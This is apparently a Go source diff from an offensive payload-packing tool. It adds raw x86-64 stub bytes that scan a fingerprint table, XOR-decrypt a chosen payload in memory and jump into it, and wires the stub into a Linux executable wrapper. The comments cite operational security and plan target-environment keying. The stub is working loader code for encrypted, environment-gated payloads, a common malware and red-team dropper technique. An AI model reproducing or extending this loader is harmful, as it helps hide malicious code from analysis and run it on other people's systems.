@@ -18,6 +18,158 @@ import (
 // The all-asm path trades operator ergonomics (no Negate / no full
 // fingerprint loop in v0.69) for binary size and OPSEC.
 
+// bundleStubScanMatchAll returns stub bytes that walk the
+// FingerprintEntry table and JMP into the first entry whose predicate
+// has the PT_MATCH_ALL bit set (bit 3 of PredicateType). On no match,
+// invokes Linux sys_exit_group(0) — the "BundleFallbackExit" semantic
+// from the spec.
+//
+// Compared to [bundleStubAlwaysIdx0], this proves the loop+dispatch
+// abstraction: the index that gets decrypted+jmp'd is no longer
+// hard-coded; it's the result of an O(n) scan over the wire-format
+// fingerprint table. Vendor-string + build-range comparisons can be
+// inserted into the per-entry test transparently — public API of
+// [WrapBundleAsExecutableLinux] does not change.
+//
+// Asm flow (additions over the always-idx-0 stub marked ★):
+//
+//	  call .pic ; pop r15 ; add r15, BUNDLE_OFF   (PIC)
+//	★ movzx ecx, word [r15+6]              ; count
+//	★ mov   r8d, [r15+8]                   ; fpOff
+//	★ add   r8, r15                        ; r8 = &fingerprint[0]
+//	★ xor   eax, eax                       ; idx
+//	★ .loop:
+//	★   cmp   eax, ecx
+//	★   jge   .no_match
+//	★   test  byte [r8], 8                 ; PT_MATCH_ALL bit
+//	★   jnz   .matched
+//	★   add   r8, 48                       ; sizeof FingerprintEntry
+//	★   inc   eax
+//	★   jmp   .loop
+//	★ .no_match:
+//	★   mov   eax, 231                     ; sys_exit_group(0)
+//	★   xor   edi, edi
+//	★   syscall
+//	★ .matched:                            ; eax = matched index
+//	★   mov   r9d, [r15+12]                ; plOff
+//	★   mov   r10d, eax
+//	★   shl   r10d, 5                      ; *32 (sizeof PayloadEntry)
+//	★   add   r9d, r10d
+//	★   add   r9, r15                      ; r9 = &PayloadEntry[eax]
+//	★   mov   rcx, r9                      ; reuse-rcx convention for tail
+//	  ; (existing decrypt+jmp tail follows — unchanged)
+//
+// Total: 73 (always-idx-0 tail) + ~50 (scan prologue) ≈ 120-130 bytes.
+//
+// Index 5 of `bundleOffsetImm32Pos` STILL points to the call/pop
+// trampoline's `add r15, imm32` immediate — the loop is between
+// that and the original tail.
+func bundleStubScanMatchAll() []byte {
+	return []byte{
+		// === PIC trampoline (same as bundleStubAlwaysIdx0) ===
+		// call .pic
+		0xe8, 0x00, 0x00, 0x00, 0x00,
+		// pop r15
+		0x41, 0x5f,
+		// add r15, imm32  (imm32 at bytes 10..13 — patched at wrap time)
+		0x49, 0x81, 0xc7, 0x00, 0x00, 0x00, 0x00,
+
+		// === Scan loop ===
+		// movzx ecx, word [r15+6]
+		0x41, 0x0f, 0xb7, 0x4f, 0x06,
+		// mov r8d, [r15+8]
+		0x45, 0x8b, 0x47, 0x08,
+		// add r8, r15
+		0x4d, 0x01, 0xf8,
+		// xor eax, eax
+		0x31, 0xc0,
+		// .loop:                                  (offset 28 from start)
+		// cmp eax, ecx                           (offset 0 within loop block)
+		0x39, 0xc8,
+		// jge .no_match  (+0x0e, skipping rest of loop body)
+		//   end-of-jge=4; .no_match=18; disp = 18-4 = 14 = 0x0e
+		0x7d, 0x0e,
+		// test byte [r8], 8                     (offset 4)
+		0x41, 0xf6, 0x00, 0x08,
+		// jnz .matched   (+0x11, skipping rest + .no_match)
+		//   end-of-jnz=10; .matched=27; disp = 27-10 = 17 = 0x11
+		0x75, 0x11,
+		// add r8, 48                            (offset 10)
+		0x49, 0x83, 0xc0, 0x30,
+		// inc eax                               (offset 14)
+		0xff, 0xc0,
+		// jmp .loop  (-0x12 = -18 → back to cmp eax, ecx)
+		//   end-of-jmp=18; .loop=0; disp = 0-18 = -18 = 0xee
+		0xeb, 0xee,
+
+		// === .no_match: Linux sys_exit_group(0) ===
+		// mov eax, 231
+		0xb8, 0xe7, 0x00, 0x00, 0x00,
+		// xor edi, edi
+		0x31, 0xff,
+		// syscall
+		0x0f, 0x05,
+
+		// === .matched: idx in eax → compute &PayloadEntry[eax] ===
+		// mov r9d, [r15+12]
+		0x45, 0x8b, 0x4f, 0x0c,
+		// mov r10d, eax
+		0x41, 0x89, 0xc2,
+		// shl r10d, 5
+		0x41, 0xc1, 0xe2, 0x05,
+		// add r9d, r10d
+		0x45, 0x01, 0xd1,
+		// add r9, r15
+		0x4d, 0x01, 0xf9,
+		// mov rcx, r9
+		0x4c, 0x89, 0xc9,
+
+		// === Decrypt+JMP tail (verbatim from bundleStubAlwaysIdx0) ===
+		// mov edi, [rcx]
+		0x8b, 0x39,
+		// add rdi, r15
+		0x4c, 0x01, 0xff,
+		// mov esi, [rcx+4]
+		0x8b, 0x71, 0x04,
+		// lea r8, [rcx+16]
+		0x4c, 0x8d, 0x41, 0x10,
+		// xor r9d, r9d
+		0x45, 0x31, 0xc9,
+		// .dec:
+		// test esi, esi
+		0x85, 0xf6,
+		// jz .jmp_payload (+0x1b)
+		0x74, 0x1b,
+		// mov al, [rdi]
+		0x8a, 0x07,
+		// mov dl, r9b
+		0x44, 0x88, 0xca,
+		// and dl, 15
+		0x80, 0xe2, 0x0f,
+		// movzx edx, dl
+		0x0f, 0xb6, 0xd2,
+		// xor al, [r8+rdx]
+		0x41, 0x32, 0x04, 0x10,
+		// mov [rdi], al
+		0x88, 0x07,
+		// inc rdi
+		0x48, 0xff, 0xc7,
+		// inc r9d
+		0x41, 0xff, 0xc1,
+		// dec esi
+		0xff, 0xce,
+		// jmp .dec  (-0x1f)
+		0xeb, 0xe1,
+		// .jmp_payload:
+		// mov edi, [rcx]
+		0x8b, 0x39,
+		// add rdi, r15
+		0x4c, 0x01, 0xff,
+		// jmp rdi
+		0xff, 0xe7,
+	}
+}
+
 // bundleStubAlwaysIdx0 returns the stub bytes for the simplest possible
 // runtime path: ignore the fingerprint table entirely and always
 // XOR-decrypt + JMP into PayloadEntry[0].
@@ -162,7 +314,11 @@ func WrapBundleAsExecutableLinux(bundle []byte) ([]byte, error) {
 			ErrBundleBadMagic, magic, BundleMagic)
 	}
 
-	stub := bundleStubAlwaysIdx0()
+	// Use the scan-match-all stub: walks the FingerprintEntry table and
+	// JMPs into the first entry whose predicate has PT_MATCH_ALL set.
+	// On no match, exit_group(0). Vendor + build matching layer in on
+	// top in a follow-up commit without changing this function's API.
+	stub := bundleStubScanMatchAll()
 	bundleOff := uint32(len(stub)) - 5 // distance from .pic label
 	binary.LittleEndian.PutUint32(stub[bundleOffsetImm32Pos:], bundleOff)
 
